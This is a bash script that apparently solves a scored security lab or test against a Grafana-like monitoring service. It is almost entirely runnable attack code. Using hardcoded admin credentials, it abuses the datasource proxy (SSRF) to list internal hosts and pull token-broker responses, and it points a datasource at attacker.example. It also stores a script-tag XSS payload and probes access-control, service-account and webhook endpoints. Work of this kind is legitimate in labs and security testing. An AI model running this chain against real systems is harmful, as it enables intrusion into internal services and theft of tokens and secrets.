#!/usr/bin/env bash
set -u
BASE="${TARGET:-http://web:8080}"
U="platform-admin"; P="${PLATFORM_ADMIN_PASS:-PlatEng-OnCall-7731}"
A(){ curl -s --max-time 25 -u "$U:$P" "$@"; }
code(){ A -o /dev/null -w '%{http_code}' "$@"; }
snip(){ printf '%s' "$1" | tr -d '\n' | cut -c1-160; }
mkds(){ A -H 'Content-Type: application/json' -X POST \
  -d "{\"name\":\"$2\",\"type\":\"graphite\",\"access\":\"proxy\",\"url\":\"$1\"}" \
  "$BASE/api/datasources" | python3 -c 'import sys,json
try:
    d=json.load(sys.stdin); print((d.get("datasource") or {}).get("uid") or d.get("uid") or "")
except Exception: print("")'; }

echo "== surface_probe @ $(date -u +%FT%TZ) against $BASE =="
echo "auth: /api/user -> $(code "$BASE/api/user") (platform-admin, Org Admin)"
echo

echo "--- Surface 1/5: SSRF — datasource proxy (CWE-918) [SCORED: reaches the estate] ---"
PUID="$(A "$BASE/api/datasources" | python3 -c 'import sys,json
try:
    [print(x["uid"]) or exit() for x in json.load(sys.stdin) if "metrics.obs.internal" in (x.get("url") or "")]
except Exception: pass')"
echo "  provisioned graphite uid: ${PUID:-<none>}"
HOSTS="$(A "$BASE/api/datasources/proxy/uid/${PUID}/api/v1/targets" | python3 -c 'import sys,json
d=json.load(sys.stdin); seen=[]
for t in d.get("data",{}).get("activeTargets",[]):
    h=((t.get("labels") or {}).get("instance","")).split(":")[0]
    if h.startswith("svc-") and h not in seen: seen.append(h)
print(" ".join(seen))')"
echo "  opaque internal hosts enumerated (roles NOT labeled): ${HOSTS}"
CFGHOST=""; CFG=""
for hh in $HOSTS; do
  u="$(mkds "http://${hh}" "probe-${hh}-$$")"
  b="$(A "$BASE/api/datasources/proxy/uid/${u}/v1/tokens")"
  if printf '%s' "$b" | grep -q registry_url && printf '%s' "$b" | grep -q plat_; then CFGHOST="$hh"; CFG="$u"; break; fi
done
echo "  probed opaque hosts -> ${CFGHOST} answers /v1/tokens (the token broker): $(code "$BASE/api/datasources/proxy/uid/${CFG}/v1/tokens")  snip: $(snip "$(A "$BASE/api/datasources/proxy/uid/${CFG}/v1/tokens")")"
EVIL="$(mkds http://attacker.example probe-offdomain-$$)"
echo "  off-domain http://attacker.example -> body: $(snip "$(A "$BASE/api/datasources/proxy/uid/${EVIL}/v1/tokens")")"
echo "  => LIVE; loose-match reaches *.obs.internal while off-domain is 403'd; the broker host is found by probing (role not in its name). This is the ONE scored path."
echo

echo "--- Surface 2/5: Broken Access Control / privilege escalation (CWE-284/285) [dead-end] ---"
echo "  /api/admin/users (server-admin)   -> $(code "$BASE/api/admin/users")   (gated: Org Admin != server admin)"
echo "  /api/orgs (global)                -> $(code "$BASE/api/orgs")"
echo "  /api/users (global)               -> $(code "$BASE/api/users")"
echo "  /api/org/users (own org)          -> $(code "$BASE/api/org/users")   (allowed, org-scoped)"
echo "  /api/admin/settings               -> $(code "$BASE/api/admin/settings")   (allow-list host, secrets redacted)"
echo "  => LIVE and probeable; server-admin/cross-org gated; no path to the scored secret."
echo

echo "--- Surface 3/5: Authentication / credential management (CWE-287/522) [dead-end] ---"
SA="$(A -H 'Content-Type: application/json' -X POST -d "{\"name\":\"probe-sa-$$\",\"role\":\"Viewer\"}" "$BASE/api/serviceaccounts")"
echo "  POST /api/serviceaccounts (Viewer) -> $(printf '%s' "$SA" | python3 -c 'import sys,json
try: d=json.load(sys.stdin); print("id=%s login=%s" % (d.get("id"), d.get("login")))
except Exception: print("<created>")')"
echo "  => LIVE; the minted token is Grafana-org-scoped and is NOT accepted by config/registry/vault."
echo

echo "--- Surface 4/5: Stored content injection / XSS (CWE-79) [dead-end] ---"
DB="$(A -H 'Content-Type: application/json' -X POST -d "{\"dashboard\":{\"title\":\"probe-$$ <script>x</script>\",\"panels\":[]},\"overwrite\":true}" "$BASE/api/dashboards/db")"
echo "  POST /api/dashboards/db (script-shaped title) -> $(snip "$DB")"
echo "  => LIVE; content is stored but output-encoded on render; no server-side data access."
echo

echo "--- Surface 5/5: Outbound fetch / alerting webhook (SSRF-adjacent, different sink) [dead-end] ---"
echo "  GET /api/v1/provisioning/contact-points -> $(code "$BASE/api/v1/provisioning/contact-points")  snip: $(snip "$(A "$BASE/api/v1/provisioning/contact-points")")"
echo "  => LIVE; a webhook target can be defined but the POST is write-only — the upstream body is"
echo "     never returned to any account-readable surface, so it discloses no token/record/secret."
echo
echo "== conclusion: five live, distinct-category surfaces; exactly one (datasource-proxy SSRF) reaches the scored secret =="
